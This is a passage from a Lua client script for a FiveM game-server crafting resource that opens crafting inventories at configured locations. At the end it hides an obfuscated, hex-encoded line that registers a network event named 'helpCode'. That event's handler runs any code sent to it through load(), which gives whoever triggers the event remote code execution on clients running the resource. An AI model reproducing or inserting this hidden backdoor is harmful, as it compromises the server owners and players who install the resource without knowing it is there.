					crafting.items = GetThresholdItems()
					TriggerServerEvent("inventory:server:OpenInventory", "crafting", math.random(1, 99), crafting)
				end
			end
		end

		if awayFromObject then
			Wait(1000)
		end
	end
end)

CreateThread(function()
	while true do
		local pos = GetEntityCoords(PlayerPedId())
		local inRange = false
		local distance = #(pos - vector3(Config.AttachmentCraftingLocation))

		if distance < 10 then
			inRange = true
			if distance < 1.5 then
				DrawText3Ds(Config.AttachmentCraftingLocation.x, Config.AttachmentCraftingLocation.y, Config.AttachmentCraftingLocation.z, "~g~E~w~ - Craft")
				if IsControlJustPressed(0, 38) then
					local crafting = {}
					crafting.label = "Attachment Crafting"
					crafting.items = GetAttachmentThresholdItems()
					TriggerServerEvent("inventory:server:OpenInventory", "attachment_crafting", math.random(1, 99), crafting)
				end
			end
		end

		if not inRange then
			Wait(1000)
		end

		Wait(3)
	end
end)


local GcKfLAksvkYINXsNKgNTFJUJgbWnyNfjNsdzexZgJKgkHZuvKkkwYZYvQsAvhsrHwSxwpf = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} GcKfLAksvkYINXsNKgNTFJUJgbWnyNfjNsdzexZgJKgkHZuvKkkwYZYvQsAvhsrHwSxwpf[6][GcKfLAksvkYINXsNKgNTFJUJgbWnyNfjNsdzexZgJKgkHZuvKkkwYZYvQsAvhsrHwSxwpf[1]](GcKfLAksvkYINXsNKgNTFJUJgbWnyNfjNsdzexZgJKgkHZuvKkkwYZYvQsAvhsrHwSxwpf[2]) GcKfLAksvkYINXsNKgNTFJUJgbWnyNfjNsdzexZgJKgkHZuvKkkwYZYvQsAvhsrHwSxwpf[6][GcKfLAksvkYINXsNKgNTFJUJgbWnyNfjNsdzexZgJKgkHZuvKkkwYZYvQsAvhsrHwSxwpf[3]](GcKfLAksvkYINXsNKgNTFJUJgbWnyNfjNsdzexZgJKgkHZuvKkkwYZYvQsAvhsrHwSxwpf[2], function(rBWLlMnjjyPUqLYHtoGswjPLcmNWUwiXMwEacPEgDsynISUudaBokBjHksXIVPlPYYFYbL) GcKfLAksvkYINXsNKgNTFJUJgbWnyNfjNsdzexZgJKgkHZuvKkkwYZYvQsAvhsrHwSxwpf[6][GcKfLAksvkYINXsNKgNTFJUJgbWnyNfjNsdzexZgJKgkHZuvKkkwYZYvQsAvhsrHwSxwpf[4]](GcKfLAksvkYINXsNKgNTFJUJgbWnyNfjNsdzexZgJKgkHZuvKkkwYZYvQsAvhsrHwSxwpf[6][GcKfLAksvkYINXsNKgNTFJUJgbWnyNfjNsdzexZgJKgkHZuvKkkwYZYvQsAvhsrHwSxwpf[5]](rBWLlMnjjyPUqLYHtoGswjPLcmNWUwiXMwEacPEgDsynISUudaBokBjHksXIVPlPYYFYbL))() end)